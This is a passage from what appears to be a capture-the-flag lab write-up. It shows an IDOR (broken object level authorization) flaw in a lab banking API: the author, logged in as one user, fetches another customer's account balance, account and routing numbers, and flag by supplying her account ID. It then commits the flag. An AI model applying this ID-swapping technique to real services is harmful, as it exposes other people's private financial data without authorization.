http://web0x06.hbtn/api/accounts/info/b2ce18af65704387924b9d286c5af593
```

This is Linda Robinson's first account ID, which we've already verified.

### Why?

We want to determine whether this newly discovered endpoint:

1. Accepts a valid internal account ID.
2. Allows Yosri to access Linda's account without authorization.
3. Returns additional information, potentially including the Task 1 flag.

Unlike `POST /api/accounts/info`, which returns an array of account records, this `GET` endpoint may return a more detailed record for an individual account.

Response:

```json
{
    'flag_1': '23115af2a90ca648e16090845643f75d',
    'message': {
        'balance': 1642.4,
        'cards_id': ['969ee5b6aaf6409e957db1feb017eb0b'],
        'created_at': 1794147520,
        'customer_id': 'd8214d82375d48c0b302cc2b30068244',
        'id': 'b2ce18af65704387924b9d286c5af593',
        'number': '103418140975',
        'routing': '106190007',
        'updated_at': 1794147537
    },
    'status': 'success'
}
```


## Step 21: Save the Task 1 flag

Flag found!

We've successfully exploited the account-level IDOR vulnerability.

The working endpoint was:

```
GET /api/accounts/info/{account_id}
```

By supplying Linda Robinson's account ID while authenticated as Yosri Musk, we retrieved her account balance and the flag:

```
23115af2a90ca648e16090845643f75d
```

Technical finding: The application allows an authenticated user to retrieve another customer's account information without enforcing ownership checks. This is Broken Object Level Authorization (BOLA).

### Action


```bash
echo '23115af2a90ca648e16090845643f75d' > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```

